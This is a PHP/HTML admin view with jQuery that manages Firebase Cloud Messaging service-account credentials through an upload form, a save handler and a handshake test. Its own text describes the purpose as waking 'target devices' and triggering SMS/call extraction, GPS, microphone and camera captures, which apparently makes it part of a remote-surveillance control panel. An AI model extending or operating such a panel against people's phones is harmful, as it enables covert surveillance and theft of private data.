<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row align-items-center">
                <div class="col-sm-8">
                    <h1 class="m-0 text-dark">
                        <i class="fas fa-fire text-warning mr-2"></i> Firebase Cloud Messaging (FCM) Settings
                    </h1>
                    <p class="text-muted mt-1 mb-0">Manage Google Cloud Firebase credentials used for real-time remote commands, device pinging, SMS/Call extraction triggers, media capture, and push dispatching.</p>
                </div>
                <div class="col-sm-4">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/settings') ?>">Settings</a></li>
                        <li class="breadcrumb-item active">Firebase (FCM)</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <?php if (session()->getFlashdata('message')): ?>
            <div class="alert alert-success alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('message') ?>
            </div>
            <?php endif; ?>

            <?php if (session()->getFlashdata('error')): ?>
            <div class="alert alert-danger alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('error') ?>
            </div>
            <?php endif; ?>

            <div class="row">
                <div class="col-md-3">
                    <div class="card card-outline card-primary shadow-sm mb-3">
                        <div class="card-header"><h3 class="card-title font-weight-bold"><i class="fas fa-sliders-h mr-1 text-primary"></i> Settings Hub</h3></div>
                        <div class="card-body p-0">
                            <ul class="nav nav-pills flex-column">
                                <li class="nav-item"><a href="<?= base_url('admin/settings') ?>" class="nav-link"><i class="fas fa-cog mr-2 text-primary"></i> General</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/api') ?>" class="nav-link"><i class="fas fa-plug mr-2 text-info"></i> API</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/security') ?>" class="nav-link"><i class="fas fa-shield-alt mr-2 text-danger"></i> Security</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/notifications') ?>" class="nav-link"><i class="fas fa-envelope mr-2 text-primary"></i> Emails & SMTP</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/fcm') ?>" class="nav-link active"><i class="fas fa-fire mr-2 text-warning"></i> Firebase (FCM)</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/maintenance') ?>" class="nav-link"><i class="fas fa-tools mr-2 text-secondary"></i> Maintenance</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/storage') ?>" class="nav-link"><i class="fas fa-chart-pie mr-2 text-success"></i> Storage Monitor</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/storage-cleanup') ?>" class="nav-link"><i class="fas fa-broom mr-2 text-warning"></i> Storage Cleanup</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/email-triggers') ?>" class="nav-link"><i class="fas fa-bell mr-2 text-info"></i> Email Triggers</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/backup') ?>" class="nav-link"><i class="fas fa-database mr-2 text-info"></i> Backup</a></li>
                                <li class="nav-item"><a href="<?= base_url('admin/settings/cron') ?>" class="nav-link"><i class="fas fa-clock mr-2 text-purple"></i> Cron Jobs</a></li>
                            </ul>
                        </div>
                    </div>

                    <div class="card card-outline card-info shadow-sm">
                        <div class="card-header"><h3 class="card-title font-weight-bold text-info"><i class="fas fa-info-circle mr-1"></i> Quick Instructions</h3></div>
                        <div class="card-body small text-muted p-3">
                            <ol class="pl-3 mb-0">
                                <li class="mb-1">Go to <a href="https://console.firebase.google.com/" target="_blank" rel="noopener noreferrer">Firebase Console</a>.</li>
                                <li class="mb-1">Select your project and open <strong>Project Settings</strong> (gear icon).</li>
                                <li class="mb-1">Navigate to the <strong>Service Accounts</strong> tab.</li>
                                <li class="mb-1">Click <strong>Generate new private key</strong>.</li>
                                <li>Upload the downloaded <code>.json</code> file or paste its content in the form.</li>
                            </ol>
                        </div>
                    </div>
                </div>

                <div class="col-md-9">
                    <!-- ==================== FIREBASE CREDENTIALS CARD ==================== -->
                    <div class="card card-outline <?= !empty($firebaseStatus['configured']) ? 'card-success' : 'card-danger' ?> shadow-sm mb-4">
                        <div class="card-header">
                            <h3 class="card-title font-weight-bold">
                                <i class="fas fa-fire text-warning mr-2"></i> Firebase Service Account Credentials
                            </h3>
                            <div class="card-tools">
                                <span id="fcm-status-badge" class="badge <?= !empty($firebaseStatus['configured']) ? 'badge-success' : 'badge-danger' ?> px-3 py-2" style="font-size: 12px;">
                                    <i class="fas <?= !empty($firebaseStatus['configured']) ? 'fa-check-circle' : 'fa-exclamation-triangle' ?> mr-1"></i>
                                    <?= !empty($firebaseStatus['configured']) ? 'Configured & Active' : 'Missing Credentials' ?>
                                </span>
                            </div>
                        </div>
                        <div class="card-body">
                            <p class="text-muted small mb-3">
                                Firebase Cloud Messaging service account credentials are required to send push notifications, wake up target devices, and dispatch real-time commands (SMS, calls, GPS, microphone, camera captures, and file sync). Upload or paste your Google Service Account JSON key below.
                            </p>

                            <!-- Current Status Overview -->
                            <div id="fcm-info-box" class="callout <?= !empty($firebaseStatus['configured']) ? 'callout-success bg-light' : 'callout-danger bg-light' ?> mb-3">
                                <div class="row">
                                    <div class="col-md-4">
                                        <small class="text-muted d-block text-uppercase font-weight-bold">Project ID</small>
                                        <span id="fcm-project-id" class="font-weight-bold <?= !empty($firebaseStatus['project_id']) ? 'text-dark' : 'text-danger' ?>">
                                            <?= htmlspecialchars($firebaseStatus['project_id'] ?? 'Not Configured') ?>
                                        </span>
                                    </div>
                                    <div class="col-md-5">
                                        <small class="text-muted d-block text-uppercase font-weight-bold">Service Account Email</small>
                                        <span id="fcm-client-email" class="font-weight-bold text-truncate d-block <?= !empty($firebaseStatus['client_email']) ? 'text-dark' : 'text-danger' ?>" title="<?= htmlspecialchars($firebaseStatus['client_email'] ?? '') ?>">
                                            <?= htmlspecialchars($firebaseStatus['client_email'] ?? 'Not Configured') ?>
                                        </span>
                                    </div>
                                    <div class="col-md-3">
                                        <small class="text-muted d-block text-uppercase font-weight-bold">Last Synced</small>
                                        <span id="fcm-updated-at" class="text-muted">
                                            <?= htmlspecialchars($firebaseStatus['updated_at'] ?? 'Never') ?>
                                        </span>
                                    </div>
                                </div>
                            </div>

                            <form id="form-firebase-upload" action="<?= base_url('admin/settings/fcm/upload-firebase') ?>" method="post" enctype="multipart/form-data">
                                <?= csrf_field() ?>

                                <ul class="nav nav-tabs mb-3" id="firebaseInputTab" role="tablist">
                                    <li class="nav-item">
                                        <a class="nav-link active" id="tab-file-link" data-toggle="tab" href="#pane-firebase-file" role="tab">
                                            <i class="fas fa-file-upload mr-1 text-primary"></i> Upload JSON File
                                        </a>
                                    </li>
                                    <li class="nav-item">
                                        <a class="nav-link" id="tab-raw-link" data-toggle="tab" href="#pane-firebase-raw" role="tab">
                                            <i class="fas fa-code mr-1 text-info"></i> Paste JSON Content
                                        </a>
                                    </li>
                                </ul>

                                <div class="tab-content" id="firebaseInputContent">
                                    <!-- TAB 1: FILE PICKER -->
                                    <div class="tab-pane fade show active" id="pane-firebase-file" role="tabpanel">
                                        <div class="form-group">
                                            <label class="font-weight-bold">Service Account JSON File <span class="text-danger">*</span></label>
                                            <div class="custom-file">
                                                <input type="file" name="firebase_file" class="custom-file-input" id="firebase_file" accept=".json,application/json">
                                                <label class="custom-file-label" for="firebase_file" id="firebase_file_label">Choose service account JSON file...</label>
                                            </div>
                                            <small class="form-text text-muted">
                                                Download from <a href="https://console.firebase.google.com/" target="_blank" rel="noopener noreferrer">Firebase Console</a> &rarr; Project Settings &rarr; Service Accounts &rarr; <em>Generate new private key</em>.
                                            </small>
                                        </div>
                                    </div>

                                    <!-- TAB 2: RAW TEXTAREA -->
                                    <div class="tab-pane fade" id="pane-firebase-raw" role="tabpanel">
                                        <div class="form-group">
                                            <label class="font-weight-bold">Paste Service Account JSON <span class="text-danger">*</span></label>
                                            <textarea name="firebase_json_raw" id="firebase_json_raw" class="form-control font-monospace" rows="7" placeholder='{
  "type": "service_account",
  "project_id": "your-firebase-project",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-...@your-firebase-project.iam.gserviceaccount.com"
}' style="font-size: 12px; font-family: SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;"></textarea>
                                            <small class="form-text text-muted">
                                                Paste the complete JSON payload directly. Useful when managing keys in headless or cloud hosting environments (e.g. Railway, Docker).
                                            </small>
                                        </div>
                                    </div>
                                </div>

                                <div class="d-flex align-items-center justify-content-between pt-3 border-top">
                                    <div>
                                        <button type="submit" id="btn-upload-firebase" class="btn btn-warning font-weight-bold text-dark shadow-sm">
                                            <i class="fas fa-cloud-upload-alt mr-1"></i> Save & Verify Firebase Key
                                        </button>
                                        <button type="button" class="btn btn-outline-primary shadow-sm ml-2" onclick="testFirebase()">
                                            <i class="fas fa-vial mr-1"></i> Test FCM Handshake
                                        </button>
                                    </div>
                                    <small class="text-muted"><i class="fas fa-shield-alt text-success mr-1"></i> Validated with Google OAuth2 API</small>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>

<script>
// File input filename display
$('#firebase_file').on('change', function() {
    var fileName = $(this).val().split('\\').pop();
    $('#firebase_file_label').text(fileName || 'Choose service account JSON file...');
});

// Firebase Form AJAX Submission
$('#form-firebase-upload').on('submit', function(e) {
    e.preventDefault();
    var formData = new FormData(this);
    var $btn = $('#btn-upload-firebase');
    var origHtml = $btn.html();

    $btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Validating & Saving...');

    $.ajax({
        url: $(this).attr('action'),
        type: 'POST',
        data: formData,
        contentType: false,
        processData: false,
        dataType: 'json',
        success: function(res) {
            $btn.prop('disabled', false).html(origHtml);
            if (res && res.success) {
                Swal.fire({
                    icon: 'success',
                    title: 'Firebase Configured!',
                    text: res.message || 'Credentials verified and saved successfully.',
                    confirmButtonColor: '#28a745'
                });

                // Update UI state dynamically
                $('#fcm-status-badge')
                    .removeClass('badge-danger')
                    .addClass('badge-success')
                    .html('<i class="fas fa-check-circle mr-1"></i> Configured & Active');
                $('#fcm-info-box')
                    .removeClass('callout-danger')
                    .addClass('callout-success');
                $('#fcm-project-id').removeClass('text-danger').addClass('text-dark').text(res.project_id || 'Configured');
                $('#fcm-client-email').removeClass('text-danger').addClass('text-dark').text(res.client_email || 'Configured');
                $('#fcm-updated-at').text(new Date().toISOString().slice(0, 19).replace('T', ' '));
                $('#firebase_json_raw').val('');
                $('#firebase_file').val('');
                $('#firebase_file_label').text('Choose service account JSON file...');
            } else {
                Swal.fire({
                    icon: 'error',
                    title: 'Validation Failed',
                    text: (res && res.message) ? res.message : 'Invalid credentials provided.',
                    confirmButtonColor: '#d33'
                });
            }
        },
        error: function(xhr) {
            $btn.prop('disabled', false).html(origHtml);
            var msg = 'Failed to upload credentials.';
            if (xhr.responseJSON && xhr.responseJSON.message) {
                msg = xhr.responseJSON.message;
            } else if (xhr.responseJSON && xhr.responseJSON.messages && xhr.responseJSON.messages.error) {
                msg = xhr.responseJSON.messages.error;
            } else if (xhr.statusText) {
                msg = xhr.statusText;
            }
            Swal.fire({
                icon: 'error',
                title: 'Upload Error',
                text: msg,
                confirmButtonColor: '#d33'
            });
        }
    });
});

// Test Firebase Handshake
function testFirebase() {
    Swal.fire({
        title: 'Testing Firebase OAuth2 Handshake...',
        text: 'Generating signed JWT and requesting bearer token from Google Cloud...',
        allowOutsideClick: false,
        didOpen: () => {
            Swal.showLoading();
            $.ajax({
                url: '<?= base_url('admin/settings/fcm/test-firebase') ?>',
                method: 'POST',
                data: {
                    '<?= csrf_token() ?>': '<?= csrf_hash() ?>'
                },
                dataType: 'json'
            }).done(function(res) {
                if (res && res.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'FCM Connection Successful!',
                        html: '<p>' + (res.message || 'OAuth2 Token successfully validated.') + '</p>' +
                              '<div class="text-left bg-light p-3 rounded small border">' +
                              '<strong>Project ID:</strong> ' + (res.project_id || 'N/A') + '<br>' +
                              '<strong>Service Account:</strong> ' + (res.client_email || 'N/A') + '<br>' +
                              '<strong>Token TTL:</strong> ' + (res.expires_in ? res.expires_in + 's' : '3600s') +
                              '</div>',
                        confirmButtonColor: '#28a745'
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'FCM Test Failed',
                        text: (res && res.message) ? res.message : 'Google OAuth2 authentication failed.',
                        confirmButtonColor: '#d33'
                    });
                }
            }).fail(function(xhr) {
                var msg = 'Network error while testing Firebase credentials.';
                if (xhr.responseJSON && xhr.responseJSON.message) {
                    msg = xhr.responseJSON.message;
                }
                Swal.fire({
                    icon: 'error',
                    title: 'Handshake Error',
                    text: msg,
                    confirmButtonColor: '#d33'
                });
            });
        }
    });
}
</script>